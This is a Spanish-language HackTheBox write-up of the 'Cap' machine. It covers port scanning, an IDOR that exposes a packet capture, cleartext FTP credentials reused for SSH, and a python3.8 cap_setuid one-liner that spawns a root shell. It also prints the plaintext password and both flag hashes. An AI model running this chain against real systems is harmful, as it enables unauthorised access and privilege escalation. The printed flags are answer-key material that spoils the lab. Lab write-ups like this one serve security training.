# Cap --- HackTheBox

**Machine:** Cap\
**Platform:** HackTheBox\
**Difficulty:** Easy\
**OS:** Linux

  -----------------------------------------------------------------------
  Field                               Value
  ----------------------------------- -----------------------------------
  Target IP                           10.129.3.19

  Domain                              cap.htb

  Services                            21/FTP · 22/SSH · 80/HTTP

  Techniques                          IDOR · FTP Credentials in PCAP ·
                                      Linux Capabilities (cap_setuid)
  -----------------------------------------------------------------------

    user.txt = aaf24ac79e5aec40014bc6cc47c80639
    root.txt = 43737038fe2d649a4b60fd02cef8449a

------------------------------------------------------------------------

# Reconocimiento

## Nmap --- Full Port Scan

Escaneo completo de puertos para descubrir servicios expuestos.

``` bash
nmap -p- --open --min-rate 4500 -n -Pn -vvv 10.129.3.19
```

Resultado:

    PORT STATE SERVICE
    21/tcp open ftp
    22/tcp open ssh
    80/tcp open http

------------------------------------------------------------------------

## Nmap --- Service & Script Scan

Detección de versiones.

``` bash
nmap -sCV -p 21,22,80 10.129.3.19
```

Resultado:

    21/tcp open ftp vsftpd 3.0.3
    22/tcp open ssh OpenSSH 8.2p1 Ubuntu
    80/tcp open http Gunicorn

La aplicación web está servida por **Gunicorn (Python)**.

------------------------------------------------------------------------

# Enumeración Web

La aplicación en el puerto 80 es un **Security Dashboard** que muestra
estadísticas:

-   Security Events
-   Failed Login Attempts
-   Port Scans

El nombre de la máquina **Cap** actúa como pista:

-   pcap capture
-   Linux capabilities

------------------------------------------------------------------------

# Vulnerabilidad --- IDOR

La sección de capturas utiliza URLs del tipo:

    /data/<id>

Ejemplo:

    http://10.129.3.19/data/1

Si cambiamos el ID:

    http://10.129.3.19/data/0

Se accede a la captura inicial del sistema.

Esto es un **IDOR (Insecure Direct Object Reference)**.

------------------------------------------------------------------------

# Análisis del PCAP

El archivo descargado:

    0.pcap

Contiene tráfico FTP en texto claro.

Extraemos credenciales con:

``` bash
tshark -r 0.pcap -Y ftp -T fields -e ftp.request.command -e ftp.request.arg
```

Resultado:

    USER nathan
    PASS Buck3tH4TF0RM3!

Credenciales:

    nathan : Buck3tH4TF0RM3!

FTP transmite credenciales **sin cifrado**.

------------------------------------------------------------------------

# Acceso Inicial

Las credenciales también funcionan en SSH.

``` bash
ssh nathan@10.129.3.19
```

Leer flag:

``` bash
cat user.txt
```

    aaf24ac79e5aec40014bc6cc47c80639

------------------------------------------------------------------------

# Escalada de Privilegios

## Linux Capabilities

Enumeramos capabilities:

``` bash
getcap -r / 2>/dev/null
```

Resultado:

    /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip

Esto permite cambiar el UID del proceso a **root**.

------------------------------------------------------------------------

## Exploit

``` bash
python3.8 -c "import os; os.setuid(0); os.system('/bin/bash')"
```

Obtenemos shell root:

``` bash
cat /root/root.txt
```

    43737038fe2d649a4b60fd02cef8449a

La capability **cap_setuid** permite modificar el UID del proceso sin
sudo.

------------------------------------------------------------------------

# Kill Chain

1.  **Recon**
    -   Nmap descubre FTP, SSH, HTTP.
2.  **Web Enumeration**
    -   Dashboard vulnerable.
3.  **IDOR**
    -   Acceso a `/data/0`.
4.  **PCAP Analysis**
    -   Credenciales FTP en claro.
5.  **Foothold**
    -   SSH como `nathan`.
6.  **Privilege Escalation**
    -   `cap_setuid` en python.

------------------------------------------------------------------------

# Lecciones Aprendidas

### IDOR

Nunca confiar en IDs secuenciales.

### FTP Cleartext

FTP transmite credenciales en texto plano.

### Reutilización de contraseñas

Una credencial comprometida en FTP permitió acceso SSH.

### Linux Capabilities

`cap_setuid` en intérpretes es equivalente a SUID root.

------------------------------------------------------------------------

# Autor

**Show@Hack4u\~**\
HackTheBox Season I
